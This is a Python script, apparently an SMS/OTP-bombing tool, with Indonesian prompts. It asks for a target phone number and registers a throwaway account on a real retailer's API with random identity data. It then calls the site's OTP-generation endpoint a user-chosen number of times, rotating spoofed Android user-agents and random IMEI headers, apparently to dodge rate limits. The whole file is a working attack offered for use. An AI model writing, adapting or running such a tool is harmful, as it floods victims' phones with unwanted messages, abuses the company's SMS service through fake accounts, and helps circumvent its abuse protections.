import requests
import random
import string
import json
import time
from datetime import datetime, timedelta


def random_string(length=8):
    """Generate a random string of given length."""
    return ''.join(random.choices(string.ascii_letters, k=length))


def random_date(start_year=1970, end_year=2005):
    """Generate a random date between start_year and end_year."""
    start = datetime(start_year, 1, 1)
    end = datetime(end_year, 12, 31)
    delta = end - start
    return (start + timedelta(days=random.randrange(delta.days + 1))).strftime('%Y-%m-%d')


def random_imei():
    """Generate a random 15-digit IMEI-like number."""
    return ''.join(random.choices(string.digits, k=15))


def main():
    phone = input("Masukkan nomor HP (contoh: 081234567890): ")

    # Registration
    reg_password = random_string(12)
    reg_payload = {
        "NamaDepan": random_string(),
        "NamaBelakang": random_string(),
        "Gender": random.choice([1, 2]),  # 1=Laki-laki, 2=Perempuan
        "Password": reg_password,
        "Phone_Number": phone,
        "TanggalLahir": random_date(),
        "LocationId": random.randint(1, 100),
        "NamaAlamat": random_string(10),
        "Alamat": random_string(20)
    }

    headers = {
        "access-control-allow-origin": "https://dandanku.com",
        "cache-control": "no-cache, private",
        "connection": "Keep-Alive",
        "content-type": "application/json",
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "origin": "https://dandanku.com",
        "referer": "https://dandanku.com/",
        "sec-ch-ua": '"Microsoft Edge";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        # user-agent dan imei akan di-set dinamis saat OTP
    }

    # Kirim registrasi
    reg_body = json.dumps(reg_payload)
    headers["content-length"] = str(len(reg_body))
    print("Registration Payload:", json.dumps(reg_payload, ensure_ascii=False))
    reg_resp = requests.post("https://core.dandanku.com/api/register", data=reg_body, headers=headers)
    print(f"Registration Status: {reg_resp.status_code}, Response: {reg_resp.text}\n")

    # Kirim login
    login_payload = {"Phone_Number": phone, "Password": reg_password}
    login_body = json.dumps(login_payload)
    headers["content-length"] = str(len(login_body))
    print("Login Payload:", json.dumps(login_payload, ensure_ascii=False))
    login_resp = requests.post("https://core.dandanku.com/api/login", data=login_body, headers=headers)
    print(f"Login Status: {login_resp.status_code}, Response: {login_resp.text}\n")

    # OTP loop
    count = int(input("Berapa kali mengirimkan OTP? "))
    for i in range(1, count + 1):
        imei = random_imei()
        ua = f"Mozilla/5.0 (Linux; Android {random.randint(6,12)}; IMEI/{imei}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80,100)}.0.0.0 Mobile Safari/537.36"
        headers["user-agent"] = ua
        headers["imei"] = imei

        otp_payload = {"Phone_Number": phone}
        otp_body = json.dumps(otp_payload)
        headers["content-length"] = str(len(otp_body))

        print(f"Mengirim OTP {i}/{count} | UA: {ua} | IMEI: {imei}")
        otp_resp = requests.post("https://core.dandanku.com/api/otpgenerate", data=otp_body, headers=headers)
        print(f"OTP Status: {otp_resp.status_code}, Response: {otp_resp.text}\n")

        if i < count:
            time.sleep(10)


if __name__ == "__main__":
    main()
